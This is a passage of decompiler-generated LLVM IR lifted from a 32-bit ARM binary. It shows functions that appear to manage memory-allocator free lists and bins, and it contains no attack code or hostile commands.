  %v2_11ec0 = sub i32 %v1_11ec0, %v2_11eb4
  store i32 %v2_11ec0, i32* %r2.global-to-local, align 4
  %v1_11ec4 = add i32 %v0_11ebc, 44
  %v2_11ec4 = inttoptr i32 %v1_11ec4 to i32*
  %v3_11ec4 = load i32, i32* %v2_11ec4, align 4
  store i32 %v3_11ec4, i32* %r1.global-to-local, align 4
  %v2_11ec8 = sub i32 %v3_11ebc, %v2_11eb4
  %v1_11ecc = or i32 %v2_11ec0, 1
  store i32 %v1_11ecc, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_11ec8, i32* %v2_11ebc, align 4
  %v0_11ed8 = load i32, i32* %r2.global-to-local, align 4
  %v1_11ed8 = load i32, i32* %r1.global-to-local, align 4
  %v2_11ed8 = add i32 %v1_11ed8, 4
  %v3_11ed8 = inttoptr i32 %v2_11ed8 to i32*
  store i32 %v0_11ed8, i32* %v3_11ed8, align 4
  %v1_11eec.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ee4

dec_label_pc_11ee0:                               ; preds = %dec_label_pc_11e80, %dec_label_pc_11eb4, %dec_label_pc_11e9c, %dec_label_pc_11e40
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ee4

dec_label_pc_11ee4:                               ; preds = %dec_label_pc_11ebc, %dec_label_pc_11ee0
  %v1_11eec = phi i32 [ %v1_11eec.pre, %dec_label_pc_11ebc ], [ 0, %dec_label_pc_11ee0 ]
  ret i32 %v1_11eec

; uselistorder directives
  uselistorder i1 %v7_11eac, { 1, 0 }
  uselistorder i32 %v1_11ea8, { 2, 1, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @function_135ac, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_11ee4, { 1, 0 }
  uselistorder label %dec_label_pc_11ee0, { 1, 2, 0, 3 }
}

define i32 @function_11ef0() local_unnamed_addr {
dec_label_pc_11ef0:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11ef0 = load i32, i32* @r4, align 4
  store i32 %v3_11ef0, i32* %stack_var_-36, align 4
  %v0_11ef4 = load i32, i32* @r0, align 4
  %v1_11ef4 = inttoptr i32 %v0_11ef4 to i32*
  %v2_11ef4 = load i32, i32* %v1_11ef4, align 4
  store i32 %v2_11ef4, i32* %r3.global-to-local, align 4
  %v2_11ef8 = icmp eq i32 %v2_11ef4, 0
  store i32 %v0_11ef4, i32* @r4, align 4
  br i1 %v2_11ef8, label %dec_label_pc_12030.preheader, label %dec_label_pc_11f0c

dec_label_pc_12030.preheader:                     ; preds = %dec_label_pc_11ef0
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1203825 = add i32 %v0_11ef4, 52
  store i32 %v1_1203825, i32* %r3.global-to-local, align 4
  %v2_1204026 = add i32 %v0_11ef4, 60
  %v3_1204027 = inttoptr i32 %v2_1204026 to i32*
  store i32 %v1_1203825, i32* %v3_1204027, align 4
  %v0_1204428 = load i32, i32* %r3.global-to-local, align 4
  %v2_1204429 = add i32 %v0_1204428, 12
  %v3_1204430 = inttoptr i32 %v2_1204429 to i32*
  store i32 %v0_1204428, i32* %v3_1204430, align 4
  br label %dec_label_pc_12030.dec_label_pc_12030_crit_edge

dec_label_pc_11f0c:                               ; preds = %dec_label_pc_11ef0
  %v1_11f0c = and i32 %v2_11ef4, -3
  %v3_11f10 = udiv i32 %v2_11ef4, 8
  store i32 %v3_11f10, i32* %r2.global-to-local, align 4
  store i32 %v1_11f0c, i32* %v1_11ef4, align 4
  %v0_11f18 = load i32, i32* @r0, align 4
  %v1_11f18 = add i32 %v0_11f18, -4
  store i32 %v1_11f18, i32* %r3.global-to-local, align 4
  %v1_11f1c = load i32, i32* %r2.global-to-local, align 4
  %v4_11f1c = mul i32 %v1_11f1c, 4
  %v5_11f1c = add i32 %v4_11f1c, %v1_11f18
  store i32 %v5_11f1c, i32* %sb.global-to-local, align 4
  %v1_11f20 = add i32 %v0_11f18, 52
  store i32 %v1_11f20, i32* %r7.global-to-local, align 4
  %v1_11f24 = add i32 %v0_11f18, 4
  store i32 %v1_11f24, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_11f2c

dec_label_pc_11f2c:                               ; preds = %dec_label_pc_12028, %dec_label_pc_11f0c
  %v1_1202010 = phi i32 [ %v1_12020, %dec_label_pc_12028 ], [ %v5_11f1c, %dec_label_pc_11f0c ]
  %v1_11f38 = phi i32 [ %v1_12028, %dec_label_pc_12028 ], [ %v1_11f24, %dec_label_pc_11f0c ]
  %v1_11f2c = inttoptr i32 %v1_11f38 to i32*
  %v2_11f2c = load i32, i32* %v1_11f2c, align 4
  store i32 %v2_11f2c, i32* %r1.global-to-local, align 4
  %v2_11f30 = icmp eq i32 %v2_11f2c, 0
  br i1 %v2_11f30, label %dec_label_pc_12020, label %dec_label_pc_11f38

dec_label_pc_11f38:                               ; preds = %dec_label_pc_11f2c
  %v0_11f38 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_11f38, i32* %v1_11f2c, align 4
  %v0_11f3c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11f3c

dec_label_pc_11f3c:                               ; preds = %dec_label_pc_12014, %dec_label_pc_11f38
  %v0_11f58 = phi i32 [ %v0_12014, %dec_label_pc_12014 ], [ %v0_11f3c.pre, %dec_label_pc_11f38 ]
  %v1_11f3c = add i32 %v0_11f58, 4
  %v2_11f3c = inttoptr i32 %v1_11f3c to i32*
  %v3_11f3c = load i32, i32* %v2_11f3c, align 4
  store i32 %v3_11f3c, i32* %r3.global-to-local, align 4
  %v1_11f40 = and i32 %v3_11f3c, -2
  store i32 %v1_11f40, i32* %lr.global-to-local, align 4
  %v2_11f44 = add i32 %v1_11f40, %v0_11f58
  store i32 %v2_11f44, i32* @r0, align 4
  %v1_11f48 = urem i32 %v3_11f3c, 2
  %v2_11f48 = icmp eq i32 %v1_11f48, 0
  %v1_11f4c = add i32 %v0_11f58, 8
  %v2_11f4c = inttoptr i32 %v1_11f4c to i32*
  %v3_11f4c = load i32, i32* %v2_11f4c, align 4
  store i32 %v3_11f4c, i32* %sl.global-to-local, align 4
  %v1_11f50 = add i32 %v2_11f44, 4
  %v2_11f50 = inttoptr i32 %v1_11f50 to i32*
  %v3_11f50 = load i32, i32* %v2_11f50, align 4
  store i32 %v3_11f50, i32* %r8.global-to-local, align 4
  br i1 %v2_11f48, label %dec_label_pc_11f58, label %dec_label_pc_11f8c

dec_label_pc_11f58:                               ; preds = %dec_label_pc_11f3c
  %v1_11f58 = inttoptr i32 %v0_11f58 to i32*
  %v2_11f58 = load i32, i32* %v1_11f58, align 4
  store i32 %v2_11f58, i32* %r5.global-to-local, align 4
  %v2_11f5c = sub i32 %v0_11f58, %v2_11f58
  store i32 %v2_11f5c, i32* %r3.global-to-local, align 4
  %v1_11f60 = add i32 %v2_11f5c, 8
  %v2_11f60 = inttoptr i32 %v1_11f60 to i32*
  %v3_11f60 = load i32, i32* %v2_11f60, align 4
  store i32 %v3_11f60, i32* %ip.global-to-local, align 4
  %v1_11f64 = add i32 %v3_11f60, 12
  %v2_11f64 = inttoptr i32 %v1_11f64 to i32*
  %v3_11f64 = load i32, i32* %v2_11f64, align 4
  store i32 %v3_11f64, i32* %r1.global-to-local, align 4
  %v9_11f68 = icmp eq i32 %v3_11f64, %v2_11f5c
  %v1_11f6c = add i32 %v2_11f5c, 12
  %v2_11f6c = inttoptr i32 %v1_11f6c to i32*
  %v3_11f6c = load i32, i32* %v2_11f6c, align 4
  store i32 %v3_11f6c, i32* %r2.global-to-local, align 4
  br i1 %v9_11f68, label %dec_label_pc_11f74, label %dec_label_pc_11fd0

dec_label_pc_11f74:                               ; preds = %dec_label_pc_11f58
  %v1_11f74 = add i32 %v3_11f6c, 8
  %v2_11f74 = inttoptr i32 %v1_11f74 to i32*
  %v3_11f74 = load i32, i32* %v2_11f74, align 4
  store i32 %v3_11f74, i32* %r3.global-to-local, align 4
  %v9_11f78 = icmp eq i32 %v3_11f74, %v2_11f5c
  br i1 %v9_11f78, label %dec_label_pc_11f80, label %dec_label_pc_11fd0

dec_label_pc_11f80:                               ; preds = %dec_label_pc_11f74
  store i32 %v3_11f60, i32* %v2_11f74, align 4
  %v0_11f84 = load i32, i32* %r2.global-to-local, align 4
  %v1_11f84 = load i32, i32* %ip.global-to-local, align 4
  %v2_11f84 = add i32 %v1_11f84, 12
  %v3_11f84 = inttoptr i32 %v2_11f84 to i32*
  store i32 %v0_11f84, i32* %v3_11f84, align 4
  %v0_11f88 = load i32, i32* %lr.global-to-local, align 4
  %v1_11f88 = load i32, i32* %r5.global-to-local, align 4
  %v2_11f88 = add i32 %v1_11f88, %v0_11f88
  store i32 %v2_11f88, i32* %lr.global-to-local, align 4
  %v0_11f90.pre = load i32, i32* @r0, align 4
  %v0_11f94.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11f8c

dec_label_pc_11f8c:                               ; preds = %dec_label_pc_11f3c, %dec_label_pc_11f80
  %v0_12004 = phi i32 [ %v1_11f40, %dec_label_pc_11f3c ], [ %v2_11f88, %dec_label_pc_11f80 ]
  %v0_11f94 = phi i32 [ %v3_11f50, %dec_label_pc_11f3c ], [ %v0_11f94.pre, %dec_label_pc_11f80 ]
  %v1_11fa8 = phi i32 [ %v2_11f44, %dec_label_pc_11f3c ], [ %v0_11f90.pre, %dec_label_pc_11f80 ]
  %v0_11f8c = load i32, i32* @r4, align 4
  %v1_11f8c = add i32 %v0_11f8c, 44
  %v2_11f8c = inttoptr i32 %v1_11f8c to i32*
  %v3_11f8c = load i32, i32* %v2_11f8c, align 4
  store i32 %v3_11f8c, i32* %r3.global-to-local, align 4
  %v9_11f90 = icmp eq i32 %v1_11fa8, %v3_11f8c
  %v1_11f94 = and i32 %v0_11f94, -4
  store i32 %v1_11f94, i32* %r5.global-to-local, align 4
  br i1 %v9_11f90, label %dec_label_pc_12004, label %dec_label_pc_11f9c

dec_label_pc_11f9c:                               ; preds = %dec_label_pc_11f8c
  %v2_11f9c = add i32 %v1_11fa8, %v1_11f94
  store i32 %v2_11f9c, i32* %r3.global-to-local, align 4
  %v1_11fa0 = add i32 %v2_11f9c, 4
  %v2_11fa0 = inttoptr i32 %v1_11fa0 to i32*
  %v3_11fa0 = load i32, i32* %v2_11fa0, align 4
  store i32 %v3_11fa0, i32* %r3.global-to-local, align 4
  %v1_11fa4 = urem i32 %v3_11fa0, 2
  %v2_11fa4 = icmp eq i32 %v1_11fa4, 0
  %v2_11fa8 = add i32 %v1_11fa8, 4
  %v3_11fa8 = inttoptr i32 %v2_11fa8 to i32*
  store i32 %v1_11f94, i32* %v3_11fa8, align 4
  br i1 %v2_11fa4, label %dec_label_pc_11fb0, label %dec_label_pc_11f9c.dec_label_pc_11fe0_crit_edge

dec_label_pc_11f9c.dec_label_pc_11fe0_crit_edge:  ; preds = %dec_label_pc_11f9c
  %v0_11fe4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_11fe0

dec_label_pc_11fb0:                               ; preds = %dec_label_pc_11f9c
  %v0_11fb0 = load i32, i32* @r0, align 4
  %v1_11fb0 = add i32 %v0_11fb0, 8
  %v2_11fb0 = inttoptr i32 %v1_11fb0 to i32*
  %v3_11fb0 = load i32, i32* %v2_11fb0, align 4
  store i32 %v3_11fb0, i32* %ip.global-to-local, align 4
  %v1_11fb4 = add i32 %v3_11fb0, 12
  %v2_11fb4 = inttoptr i32 %v1_11fb4 to i32*
  %v3_11fb4 = load i32, i32* %v2_11fb4, align 4
  store i32 %v3_11fb4, i32* %r3.global-to-local, align 4
  %v9_11fb8 = icmp eq i32 %v3_11fb4, %v0_11fb0
  %v1_11fbc = add i32 %v0_11fb0, 12
  %v2_11fbc = inttoptr i32 %v1_11fbc to i32*
  %v3_11fbc = load i32, i32* %v2_11fbc, align 4
  store i32 %v3_11fbc, i32* %r2.global-to-local, align 4
  br i1 %v9_11fb8, label %dec_label_pc_11fc4, label %dec_label_pc_11fd0

dec_label_pc_11fc4:                               ; preds = %dec_label_pc_11fb0
  %v1_11fc4 = add i32 %v3_11fbc, 8
  %v2_11fc4 = inttoptr i32 %v1_11fc4 to i32*
  %v3_11fc4 = load i32, i32* %v2_11fc4, align 4
  store i32 %v3_11fc4, i32* %r3.global-to-local, align 4
  %v9_11fc8 = icmp eq i32 %v3_11fc4, %v0_11fb0
  br i1 %v9_11fc8, label %dec_label_pc_11fd4, label %dec_label_pc_11fd0

dec_label_pc_11fd0:                               ; preds = %dec_label_pc_11fb0, %dec_label_pc_11f74, %dec_label_pc_11f58, %dec_label_pc_11fc4
  %v0_11fd0 = call i32 @function_12320()
  store i32 %v0_11fd0, i32* @r0, align 4
  %v0_11fd4.pre = load i32, i32* @ip, align 4
  %v1_11fd4.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_11fd4

dec_label_pc_11fd4:                               ; preds = %dec_label_pc_11fc4, %dec_label_pc_11fd0
  %v1_11fd4 = phi i32 [ %v3_11fbc, %dec_label_pc_11fc4 ], [ %v1_11fd4.pre, %dec_label_pc_11fd0 ]
  %v0_11fd4 = phi i32 [ %v3_11fb0, %dec_label_pc_11fc4 ], [ %v0_11fd4.pre, %dec_label_pc_11fd0 ]
  %v2_11fd4 = add i32 %v1_11fd4, 8
  %v3_11fd4 = inttoptr i32 %v2_11fd4 to i32*
  store i32 %v0_11fd4, i32* %v3_11fd4, align 4
  %v0_11fd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_11fd8 = load i32, i32* %ip.global-to-local, align 4
  %v2_11fd8 = add i32 %v1_11fd8, 12
  %v3_11fd8 = inttoptr i32 %v2_11fd8 to i32*
  store i32 %v0_11fd8, i32* %v3_11fd8, align 4
  %v0_11fdc = load i32, i32* %lr.global-to-local, align 4
  %v1_11fdc = load i32, i32* %r5.global-to-local, align 4
  %v2_11fdc = add i32 %v1_11fdc, %v0_11fdc
  store i32 %v2_11fdc, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_11fe0

dec_label_pc_11fe0:                               ; preds = %dec_label_pc_11f9c.dec_label_pc_11fe0_crit_edge, %dec_label_pc_11fd4
  %v0_11fe4 = phi i32 [ %v0_11fe4.pre, %dec_label_pc_11f9c.dec_label_pc_11fe0_crit_edge ], [ %v2_11fdc, %dec_label_pc_11fd4 ]
  %v0_11fe0 = load i32, i32* %r7.global-to-local, align 4
  %v1_11fe0 = add i32 %v0_11fe0, 8
  %v2_11fe0 = inttoptr i32 %v1_11fe0 to i32*
  %v3_11fe0 = load i32, i32* %v2_11fe0, align 4
  store i32 %v3_11fe0, i32* %r2.global-to-local, align 4
  %v1_11fe4 = or i32 %v0_11fe4, 1
  store i32 %v1_11fe4, i32* %r3.global-to-local, align 4
  %v0_11fe8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11fe8, i32* %v2_11fe0, align 4
  %v0_11fec = load i32, i32* %r1.global-to-local, align 4
  %v1_11fec = load i32, i32* %r2.global-to-local, align 4
  %v2_11fec = add i32 %v1_11fec, 12
  %v3_11fec = inttoptr i32 %v2_11fec to i32*
  store i32 %v0_11fec, i32* %v3_11fec, align 4
  %v0_11ff0 = load i32, i32* %lr.global-to-local, align 4
  %v1_11ff0 = load i32, i32* %r1.global-to-local, align 4
  %v3_11ff0 = add i32 %v1_11ff0, %v0_11ff0
  %v4_11ff0 = inttoptr i32 %v3_11ff0 to i32*
  store i32 %v0_11ff0, i32* %v4_11ff0, align 4
  %v0_11ff4 = load i32, i32* %r3.global-to-local, align 4
  %v1_11ff4 = load i32, i32* %r1.global-to-local, align 4
  %v2_11ff4 = add i32 %v1_11ff4, 4
  %v3_11ff4 = inttoptr i32 %v2_11ff4 to i32*
  store i32 %v0_11ff4, i32* %v3_11ff4, align 4
  %v0_11ff8 = load i32, i32* %r2.global-to-local, align 4
  %v1_11ff8 = load i32, i32* %r1.global-to-local, align 4
  %v2_11ff8 = add i32 %v1_11ff8, 8
  %v3_11ff8 = inttoptr i32 %v2_11ff8 to i32*
  store i32 %v0_11ff8, i32* %v3_11ff8, align 4
  %v0_11ffc = load i32, i32* %r7.global-to-local, align 4
  %v1_11ffc = load i32, i32* %r1.global-to-local, align 4
  %v2_11ffc = add i32 %v1_11ffc, 12
  %v3_11ffc = inttoptr i32 %v2_11ffc to i32*
  store i32 %v0_11ffc, i32* %v3_11ffc, align 4
  br label %dec_label_pc_12014

dec_label_pc_12004:                               ; preds = %dec_label_pc_11f8c
  %v2_12004 = add i32 %v1_11f94, %v0_12004
  %v1_12008 = or i32 %v2_12004, 1
  store i32 %v1_12008, i32* %r3.global-to-local, align 4
  %v1_1200c = load i32, i32* %r1.global-to-local, align 4
  %v2_1200c = add i32 %v1_1200c, 4
  %v3_1200c = inttoptr i32 %v2_1200c to i32*
  store i32 %v1_12008, i32* %v3_1200c, align 4
  %v0_12010 = load i32, i32* %r1.global-to-local, align 4
  %v1_12010 = load i32, i32* @r4, align 4
  %v2_12010 = add i32 %v1_12010, 44
  %v3_12010 = inttoptr i32 %v2_12010 to i32*
  store i32 %v0_12010, i32* %v3_12010, align 4
  br label %dec_label_pc_12014

dec_label_pc_12014:                               ; preds = %dec_label_pc_11fe0, %dec_label_pc_12004
  %v0_12014 = load i32, i32* %sl.global-to-local, align 4
  %v2_12014 = icmp eq i32 %v0_12014, 0
  store i32 %v0_12014, i32* %r1.global-to-local, align 4
  br i1 %v2_12014, label %dec_label_pc_12020.loopexit, label %dec_label_pc_11f3c

dec_label_pc_12020.loopexit:                      ; preds = %dec_label_pc_12014
  %v0_12020.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_12020.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_12020

dec_label_pc_12020:                               ; preds = %dec_label_pc_12020.loopexit, %dec_label_pc_11f2c
  %v1_12020 = phi i32 [ %v1_12020.pre, %dec_label_pc_12020.loopexit ], [ %v1_1202010, %dec_label_pc_11f2c ]
  %v0_12028 = phi i32 [ %v0_12020.pre, %dec_label_pc_12020.loopexit ], [ %v1_11f38, %dec_label_pc_11f2c ]
  %v9_12020 = icmp eq i32 %v0_12028, %v1_12020
  br i1 %v9_12020, label %dec_label_pc_12098, label %dec_label_pc_12028

dec_label_pc_12028:                               ; preds = %dec_label_pc_12020
  %v1_12028 = add i32 %v0_12028, 4
  store i32 %v1_12028, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11f2c

dec_label_pc_12030.dec_label_pc_12030_crit_edge:  ; preds = %dec_label_pc_12030.preheader, %dec_label_pc_12030.dec_label_pc_12030_crit_edge
  %v0_12030.pre = load i32, i32* @r4, align 4
  %v1_12030.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_12030 = mul i32 %v1_12030.pre, 8
  %v5_12030 = add i32 %v4_12030, %v0_12030.pre
  %v1_12034 = add i32 %v1_12030.pre, 1
  store i32 %v1_12034, i32* %r2.global-to-local, align 4
  %v1_12038 = add i32 %v5_12030, 44
  store i32 %v1_12038, i32* %r3.global-to-local, align 4
  %v2_12040 = add i32 %v5_12030, 52
  %v3_12040 = inttoptr i32 %v2_12040 to i32*
  store i32 %v1_12038, i32* %v3_12040, align 4
  %v0_12044 = load i32, i32* %r3.global-to-local, align 4
  %v2_12044 = add i32 %v0_12044, 12
  %v3_12044 = inttoptr i32 %v2_12044 to i32*
  store i32 %v0_12044, i32* %v3_12044, align 4
  %v7_12048 = icmp sgt i32 %v1_12034, 95
  br i1 %v7_12048, label %dec_label_pc_1204c, label %dec_label_pc_12030.dec_label_pc_12030_crit_edge

dec_label_pc_1204c:                               ; preds = %dec_label_pc_12030.dec_label_pc_12030_crit_edge
  %v0_1204c = load i32, i32* @r4, align 4
  %v1_1204c = inttoptr i32 %v0_1204c to i32*
  %v2_1204c = load i32, i32* %v1_1204c, align 4
  store i32 %v2_1204c, i32* %r2.global-to-local, align 4
  %v1_12050 = add i32 %v0_1204c, 864
  %v2_12050 = inttoptr i32 %v1_12050 to i32*
  %v3_12050 = load i32, i32* %v2_12050, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_12058 = urem i32 %v2_1204c, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_12060 = or i32 %v3_12050, 1
  store i32 %v1_12060, i32* %r1.global-to-local, align 4
  %v1_12064 = or i32 %v1_12058, 72
  store i32 %v1_12064, i32* %r2.global-to-local, align 4
  %v1_12068 = add i32 %v0_1204c, 52
  store i32 %v1_12068, i32* %ip.global-to-local, align 4
  %v2_1206c = add i32 %v0_1204c, 840
  %v3_1206c = inttoptr i32 %v2_1206c to i32*
  store i32 0, i32* %v3_1206c, align 4
  %v0_12070 = load i32, i32* %r3.global-to-local, align 4
  %v1_12070 = add i32 %v0_12070, 65536
  store i32 %v1_12070, i32* %r3.global-to-local, align 4
  %v0_12074 = load i32, i32* %r0.global-to-local, align 4
  %v1_12074 = load i32, i32* @r4, align 4
  %v2_12074 = add i32 %v1_12074, 836
  %v3_12074 = inttoptr i32 %v2_12074 to i32*
  store i32 %v0_12074, i32* %v3_12074, align 4
  %v0_12078 = load i32, i32* %r0.global-to-local, align 4
  %v1_12078 = load i32, i32* @r4, align 4
  %v2_12078 = add i32 %v1_12078, 844
  %v3_12078 = inttoptr i32 %v2_12078 to i32*
  store i32 %v0_12078, i32* %v3_12078, align 4
  %v1_1207c = load i32, i32* @r4, align 4
  %v2_1207c = add i32 %v1_1207c, 852
  %v3_1207c = inttoptr i32 %v2_1207c to i32*
  store i32 %v1_12070, i32* %v3_1207c, align 4
  %v1_12080 = load i32, i32* @r4, align 4
  %v2_12080 = add i32 %v1_12080, 864
  %v3_12080 = inttoptr i32 %v2_12080 to i32*
  store i32 %v1_12060, i32* %v3_12080, align 4
  %v1_12084 = load i32, i32* @r4, align 4
  %v2_12084 = inttoptr i32 %v1_12084 to i32*
  store i32 %v1_12064, i32* %v2_12084, align 4
  %v0_12088 = load i32, i32* %ip.global-to-local, align 4
  %v1_12088 = load i32, i32* @r4, align 4
  %v2_12088 = add i32 %v1_12088, 44
  %v3_12088 = inttoptr i32 %v2_12088 to i32*
  store i32 %v0_12088, i32* %v3_12088, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_12090 = call i32 @function_128f4(i32 30, i32 %v1_12060, i32 %v1_12064, i32 %v1_12070)
  store i32 %v4_12090, i32* @r0, align 4
  %v1_12094 = load i32, i32* @r4, align 4
  %v2_12094 = add i32 %v1_12094, 860
  %v3_12094 = inttoptr i32 %v2_12094 to i32*
  store i32 %v4_12090, i32* %v3_12094, align 4
  br label %dec_label_pc_12098

dec_label_pc_12098:                               ; preds = %dec_label_pc_12020, %dec_label_pc_1204c
  %v2_1209c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1209c, i32* @r4, align 4
  %v1_120a0 = load i32, i32* @r0, align 4
  ret i32 %v1_120a0

; uselistorder directives
  uselistorder i32 %v0_1204c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12044, { 1, 0 }
  uselistorder i32 %v1_12028, { 1, 0 }
  uselistorder i32 %v0_12014, { 0, 2, 1 }
  uselistorder i32 %v0_11ff0, { 1, 0 }
  uselistorder i32 %v1_11f40, { 1, 0, 2 }
  uselistorder i32 %v0_11f58, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_11f18, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 17 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 12, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12098, { 1, 0 }
  uselistorder label %dec_label_pc_12030.dec_label_pc_12030_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12014, { 1, 0 }
  uselistorder label %dec_label_pc_11fe0, { 1, 0 }
  uselistorder label %dec_label_pc_11fd4, { 1, 0 }
  uselistorder label %dec_label_pc_11fd0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11f8c, { 1, 0 }
}

define i32 @function_120a4() local_unnamed_addr {
dec_label_pc_120a4:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_120a4 = load i32, i32* @r4, align 4
  %v6_120a4 = load i32, i32* @r5, align 4
  %v9_120a4 = load i32, i32* @r6, align 4
  %v12_120a4 = load i32, i32* @r7, align 4
  %v18_120a4 = load i32, i32* @lr, align 4
  %v0_120ac = load i32, i32* @r0, align 4
  store i32 %v0_120ac, i32* @r6, align 4
  %v2_120ac = icmp eq i32 %v0_120ac, 0
  %v2_120b0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 123764, i32* @r7, align 4
  br i1 %v2_120ac, label %dec_label_pc_122b8, label %dec_label_pc_120bc

dec_label_pc_120bc:                               ; preds = %dec_label_pc_120a4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_120c0 = load i32, i32* inttoptr (i32 123832 to i32*), align 8
  store i32 %v4_120c0, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_120c0, i32* %r2.global-to-local, align 4
  %v4_120cc = load i32, i32* inttoptr (i32 123800 to i32*), align 8
  store i32 %v4_120cc, i32* %r1.global-to-local, align 4
  store i32 %v2_120b0, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_120d8 = load i32, i32* inttoptr (i32 123836 to i32*), align 4
  store i32 %v4_120d8, i32* %ip.global-to-local, align 4
  store i32 73956, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_120d8)
  %v0_120e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_120e4, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_120ec = load i32, i32* @r7, align 4
  %v2_120ec = add i32 %v0_120ec, 16
  %v3_120ec = inttoptr i32 %v2_120ec to i32*
  %v4_120ec = load i32, i32* %v3_120ec, align 4
  store i32 %v4_120ec, i32* %ip.global-to-local, align 4
  store i32 73976, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_120ec)
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_120fc = load i32, i32* @r7, align 4
  %v2_120fc = add i32 %v0_120fc, 32
  %v3_120fc = inttoptr i32 %v2_120fc to i32*
  %v4_120fc = load i32, i32* %v3_120fc, align 4
  store i32 %v4_120fc, i32* @lr, align 4
  %v0_12100 = load i32, i32* @r6, align 4
  %v1_12100 = add i32 %v0_12100, -4
  %v2_12100 = inttoptr i32 %v1_12100 to i32*
  %v3_12100 = load i32, i32* %v2_12100, align 4
  store i32 %v3_12100, i32* %r2.global-to-local, align 4
  %v1_12104 = inttoptr i32 %v4_120fc to i32*
  %v2_12104 = load i32, i32* %v1_12104, align 4
  store i32 %v2_12104, i32* %r3.global-to-local, align 4
  %v1_12108 = and i32 %v3_12100, -4
  store i32 %v1_12108, i32* %ip.global-to-local, align 4
  %v1_1210c = add i32 %v0_12100, -8
  store i32 %v1_1210c, i32* @r5, align 4
  store i32 %v1_1210c, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_12108, %v2_12104
  br i1 %tmp, label %dec_label_pc_1213c, label %dec_label_pc_1211c

dec_label_pc_1211c:                               ; preds = %dec_label_pc_120bc
  %v1_1211c = or i32 %v2_12104, 3
  store i32 %v1_1211c, i32* %r3.global-to-local, align 4
  store i32 %v1_1211c, i32* %v1_12104, align 4
  %v3_12120 = load i32, i32* @lr, align 4
  %v4_12120 = add i32 %v3_12120, -8
  store i32 %v4_12120, i32* %lr.global-to-local, align 4
  %v0_12124 = load i32, i32* %ip.global-to-local, align 4
  %v3_12124 = udiv i32 %v0_12124, 8
  store i32 %v3_12124, i32* %r1.global-to-local, align 4
  %v1_12128 = add i32 %v3_12120, -4
  store i32 %v1_12128, i32* %r2.global-to-local, align 4
  %v4_1212c = mul nuw i32 %v3_12124, 4
  %v5_1212c = add i32 %v4_1212c, %v1_12128
  %v6_1212c = inttoptr i32 %v5_1212c to i32*
  %v7_1212c = load i32, i32* %v6_1212c, align 4
  store i32 %v7_1212c, i32* %r3.global-to-local, align 4
  %v1_12130 = load i32, i32* @r5, align 4
